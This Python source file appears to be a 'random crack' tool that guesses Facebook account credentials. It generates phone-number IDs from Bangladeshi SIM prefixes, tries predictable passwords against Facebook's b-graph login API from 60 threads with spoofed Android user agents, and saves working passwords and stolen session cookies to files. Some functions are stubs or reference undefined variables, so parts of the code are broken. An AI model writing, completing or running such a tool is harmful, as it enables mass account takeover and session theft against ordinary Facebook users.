import os, sys, time, random, uuid, json, requests, re, zlib, marshal, base64, string
from concurrent.futures import ThreadPoolExecutor


# --- ১. রঙ এবং টেক্সট ফরম্যাট (Updated for SHAHIN V2) ---
G1 = '\x1b[1;97m'  # সাদা (White)
G2 = '\x1b[38;5;46m' # সবুজ (Green)
G4 = '\x1b[1;31m'    # লাল (Red)
G3 = '\x1b[1;32m'    # হালকা সবুজ
G5 = '\x1b[1;92m'    # উজ্জ্বল সবুজ
Y  = '\x1b[1;93m'    # হলুদ
T  = '\x1b[1;94m'    # নীল
O  = '\x1b[1;96m'    # সায়ান
BL = '\x1b[1;90m'    # ধূসর

# --- ২. লোগো এবং ক্লিয়ার ফাংশন (ডিজাইন: SHAHIN) ---
logo = f"""
{G2}  ██████  ██   ██  █████  ██   ██ ██ ███    ██ 
 ██       ██   ██ ██   ██ ██   ██ ██ ████   ██ 
  █████   ███████ ███████ ███████ ██ ██ ██  ██ 
      ██  ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
  ██████  ██   ██ ██   ██ ██   ██ ██ ██   ████ 
{G1}------------------------------------------------
 {G2}OWNER      {G1}: {G2}SHAHIN MOJUMDER
 {G2}GITHUB     {G1}: {G2}w8Shahin
 {G2}TOOL       {G1}: {G2}RANDOM / PAID V2
{G1}------------------------------------------------"""

def clear():
    # টার্মিনাল ক্লিয়ার করার আধুনিক সিস্টেম
    os.system('clear')
    print(logo)

# --- ৩. রেজাল্ট কাউন্টার এবং গ্লোবাল স্টেট ---
# ডাটা ট্র্যাকিং সহজ করার জন্য এগুলোকে হুবহু রাখা হয়েছে
ok = 0        # সফল আইডির সংখ্যা
cp = 0        # চেকপয়েন্ট আইডির সংখ্যা
loop = 0      # কতগুলো আইডি চেক হয়েছে
twf = 0       # Two-factor আইডি
id = []       # আইডির লিস্ট
plist = []    # পাসওয়ার্ড লিস্ট
methods = []  # মেথড স্টোর
proxs = []    # প্রক্সি লিস্ট

def update():
    try:
        url = "https://raw.githubusercontent.com/w8Shahin/FB_clone_id/main/Ver.txt"
        
        res = requests.get(url, timeout=10)

        if res.status_code == 200:
            ver_check = res.text.strip()
            current_ver = "1.5"

            if current_ver != ver_check:
                print("[*] New update found...")
                time.sleep(1)

                # check git repo exists কিনা
                if os.path.exists(".git"):
                    os.system("git pull")
                    print("[*] Update completed successfully!")
                    print("[*] Restart the tool to apply changes.")
                else:
                    print("[!] Git repo not found. Please re-clone tool.")

                sys.exit()
            else:
                print("[*] Tool is up to date.")

        else:
            print("[!] Failed to check update (server error).")

    except requests.exceptions.ConnectionError:
        print("[!] No internet connection.")
    except requests.exceptions.Timeout:
        print("[!] Request timeout, try again later.")
    except Exception as e:
        print(f"[!] Update error: {e}")

def get_proxies():
    try:
        # প্রক্সিস্ক্রেপ থেকে লেটেস্ট SOCKS4 প্রক্সি ডাউনলোড করা
        proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all"
        os.system(f'curl -s "{proxy_url}" > socksku.txt')
        print("[*] Proxies downloaded successfully!")
    except Exception as e:
        print("[!] Proxy download failed.")

def ugen():
    device_list = [
        "SM-G950F", "SM-G960F", "SM-A505F", "SM-A705F",
        "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 9",
        "RMX1911", "CPH1909", "Vivo 1906"
    ]

    android_versions = ["7.0", "8.1", "9", "10", "11", "12", "13"]

    build_ids = [
        "NRD90M", "OPM1", "PKQ1", "QP1A", "RP1A", "SP1A", "TP1A"
    ]

    locales = ["en_US", "en_GB", "bn_BD", "hi_IN"]

    densities = ["2.0", "2.5", "3.0", "3.5"]
    resolutions = ["720x1280", "1080x1920", "1080x2340"]

    device = random.choice(device_list)
    android = random.choice(android_versions)
    build = random.choice(build_ids)
    locale = random.choice(locales)
    density = random.choice(densities)
    width, height = random.choice(resolutions).split("x")

    fb_version = f"{random.randint(250,400)}.0.0.{random.randint(10,80)}.{random.randint(1,200)}"

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{build}) "
        f"[FBAN/FB4A;FBAV/{fb_version};"
        f"FBBV/{random.randint(100000000,999999999)};"
        f"FBDM={{density={density},width={width},height={height}}};"
        f"FBLC/{locale};FBCR/GP;FBMF/{device.split()[0]};"
        f"FBBD/{device.split()[0]};FBPN/com.facebook.katana;]"
    )

    return ua

# বাইটকোডের source: 72 এবং 99 অনুযায়ী
def dalvik_ua_pro():
    # এটি মূলত Xiaomi/Redmi ডিভাইসের ডেটা ফেক করার একটি লজিক
    dalvik_ver = "2.1.0"
    android_ver = "9"
    model = "Redmi Note 8T"
    build = "QP1A.190711.020"
    
    ua = f"Dalvik/{dalvik_ver} (Linux; U; Android {android_ver}; {model} Build/{build}) " \
         f"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua
    
     # বাইটকোডের লজিক অনুযায়ী পাসওয়ার্ড লিস্টের এক্সটেনশন
def get_psw(uid, number):
    ...
    return psw

def handle_cookies(res_headers, uid):
    ...
    
    first_six = number[:6]
    last_six = number[-6:]
    name_list = ["shahin123", "shahin786", "shahin123", "786786", "11223344"]
    
    psw = [uid, number, first_six, last_six] + name_list
    
    try:
        # ফেসবুক রেসপন্স থেকে কুকি স্ট্রিং বের করা
        cookie_data = res_headers.get('set-cookie', '')
        if 'c_user' in cookie_data:
            # Regular Expression দিয়ে c_user এবং xs খুঁজে বের করা
            c_user = re.findall('c_user=(.*?);', cookie_data)[0]
            xs = re.findall('xs=(.*?);', cookie_data)[0]
            
            # পূর্ণাঙ্গ কুকি ফরম্যাট তৈরি
            full_cookie = f"c_user={c_user};xs={xs};"
            
            # কুকি ফাইলে সেভ করা
            open('/sdcard/SIFAT-DATA/SIFAT-COOKIE.txt', 'a').write(f"{uid}|{full_cookie}\n")
            return full_cookie
    except:
        return None

def build_headers(ua):
    headers = {
        "User-Agent": ua,
        "X-FB-Friendly-Name": "authenticate",
        "X-FB-Connection-Bandwidth": str(random.randint(20000, 40000)),
        "X-FB-Net-HNI": str(random.randint(10000, 99999)),
        "X-FB-SIM-HNI": str(random.randint(10000, 99999)),
        "X-FB-Connection-Type": "unknown",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger"
    }
    return headers
    
    # লগইন ফাংশনের ভেতরের রেসপন্স চেকিং লজিক
def login_multi(uid, psw_list, ua):
    global ok, cp, loop
    for pw in psw_list:
        # API তে রিকোয়েস্ট পাঠানোর পর...
        response = ... # (পার্ট ৪-এ দেওয়া API রিকোয়েস্ট লজিক)
        
        # ১. যদি সেশন কি পাওয়া যায় (সফল লগইন/OK)
        if 'session_key' in response:
            print(f"\r\x1b[1;92m[SIFAT-OK] {uid} | {pw}\x1b[0m")
            
            # কুকি (Cookies) বের করার পদ্ধতি
            cookies = ";".join([f"{key}={value}" for key, value in response.get("session_cookies", {}).items()])
            print(f"\r\x1b[1;97m[🍪] COOKIES : {cookies}")
            
            # ভয়েস অ্যালার্ট এবং ফাইল সেভ
            os.system('espeak -a 300 "ok id"')
            open('/sdcard/SIFAT-OK.txt', 'a').write(f"{uid}|{pw}\n")
            ok += 1
            break
            
        # ২. যদি চেকপয়েন্ট (Checkpoint/CP) আসে
        elif 'error_detail_type' in response and response['error_detail_type'] == 'checkpoint':
            print(f"\r\x1b[1;93m[SIFAT-CP] {uid} | {pw}\x1b[0m")
            
            os.system('espeak -a 300 "cp id"')
            open('/sdcard/SIFAT-CP.txt', 'a').write(f"{uid}|{pw}\n")
            cp += 1
            break
            
        # ৩. যদি টু-ফ্যাক্টর অথেনটিকেশন (2FA) থাকে
        elif 'error_detail_type' in response and response['error_detail_type'] == 'two_factor':
            print(f"\r\x1b[1;95m[shahin-2F] {uid} | {pw}\x1b[0m")
            
            os.system('espeak -a 300 "two,f id"')
            open('/sdcard/shahin-2F.txt', 'a').write(f"{uid}|{pw}\n")
            break

def handle_response(res, uid, pw):
    global ok, cp
    # সেশন কি (Session Key) থাকলে আইডি OK
    if "session_key" in res:
        ok += 1
        # espeak দিয়ে সাউন্ড অ্যালার্ট
        os.system('espeak -a 300 "ok id"')
        
        # কুকি ম্যানেজমেন্ট পার্ট কল করা
        cookie = handle_cookies(res.get('session_cookies', {}), uid)
        
        print(f"\r\033[1;32m[SIFAT-OK] {uid} | {pw}")
        if cookie:
            print(f"\033[1;37m[🍪] COOKIE : {cookie}")
            
        # ডাটা সেভ করা
        save_path = '/sdcard/SIFAT-DATA/SIFAT-OK.txt'
        with open(save_path, 'a') as f:
            f.write(f"{uid}|{pw}|{cookie}\n")
            
    # চেকপয়েন্ট হলে CP সেকশন
    elif "error" in res and "checkpoint" in str(res):
        cp += 1
        print(f"\r\033[1;91m[SIFAT-CP] {uid} | {pw}")
        open('/sdcard/SIFAT-DATA/SIFAT-CP.txt', 'a').write(f"{uid}|{pw}\n")

def rmenu1():
    clear()
    print("[A] RANDOM CRACK BANGLADESH")
    print("[B] RANDOM CRACK PAKISTAN")
    print("[C] RANDOM CRACK INDIA")
    choice = input("Choice : ")
    
    if choice in ['A', 'a']:
        # বাংলাদেশ সিম কোড সিলেকশন
        print("BD SIM CODE: 017 015 018 019 013 016")
        code = input("Choice : ")
        limit = int(input("LIMIT: 10000, 20000, 50000: "))
        # ক্লোনিং প্রসেস শুরু
        BDXr(code, limit)

def Main():
    os.system('clear')
    print(logo)
    print(f' [{G2}1{G1}] FILE CRACK')
    print(f' [{G2}2{G1}] RANDOM CRACK')
    print(f' [{G2}3{G1}] CONTACT OWNER')
    print(f' [{G2}0{G1}] EXIT')
    print(f'{G1} {42*"—"}')
    
    choice = input(f' {G1}[{G2}•{G1}] Choice : ')
    
    if choice in ['1','01']:
        pass
    elif choice in ['2','02']:
        rmenu1()
    elif choice in ['3','03']:
        os.system('xdg-open https://wa.me/+88017XXXXXXXX')
    elif choice in ['0','00']:
        sys.exit()
    else:
        print(f'{G4}[!] CHOOSE VALID OPTION')
        time.sleep(1)
        Main()

def file_crack_menu():
    pass
def BDXr(code, limit):
    clear()
    print(logo)
    print(f"[*] TOTAL ID : {limit}")
    print(f"[*] SIM CODE : {code}")
    print("[*] THE PROCESS HAS BEEN STARTED")
    print("[*] USE AEROPLANE MODE IN EVERY 5 MIN")
    print(45 * "-")

    with ThreadPoolExecutor(max_workers=60) as ghx:
        for _ in range(int(limit)):
            number = ''.join(random.choice(string.digits) for _ in range(7))
            uid = code + number

            psw_list = [
                uid,
                number,
                code + number[:4],
                "bangladesh",
                "free fire"
            ]

            # ✅ IMPORTANT: loop must be inside
            for pw in psw_list:
                ghx.submit(login, uid, pw, ugen())
    

def login(email, password, user_agent):
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "adid": str(uuid.uuid4()),
        "email": email,
        "password": password,
        "format": "json",
        "device_id": str(uuid.uuid4()),
        "locale": "en_GB",
        "client_country_code": "GB",
        "fb_api_req_friendly_name": "authenticate"
    }
    headers = {
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger"
    }
    response = requests.post(url, data=data, headers=headers).json()
    
    if "session_key" in response:
        print(f"[SHAHIN-OK] {email} | {password}")
        open("/sdcard/SHAHIN-OK.txt", "a").write(f"{email}|{password}\n")
    elif "error_detail_type" in response and response["error_detail_type"] == "checkpoint":
        print(f"[SHAHIN-CP] {email} | {password}")

# বাইটকোডের source: 13 এবং 64 অনুযায়ী
def INDX(code, limit):
    # ভারতের সিম কোড: 9670, 9725, 8948, 8795, 6383
    # লজিক বাংলাদেশের BDXr মেথডের মতোই, শুধু ডিজিট সংখ্যা আলাদা
    pass

def PAKX(code, limit):
    pass

def end():
    print(45 * "-")
    print(f"[*] TOTAL OK : {ok}")
    print(f"[*] TOTAL CP : {cp}")
    print("[*] PROCESS COMPLETED")
    print(45 * "-")
    input("[*] PRESS ENTER TO BACK")
    rmenu1()

if __name__ == '__main__':
    try:
        os.system('mkdir -p /sdcard')
        rmenu1()
    except Exception as e:
        print(f"Error: {e}")
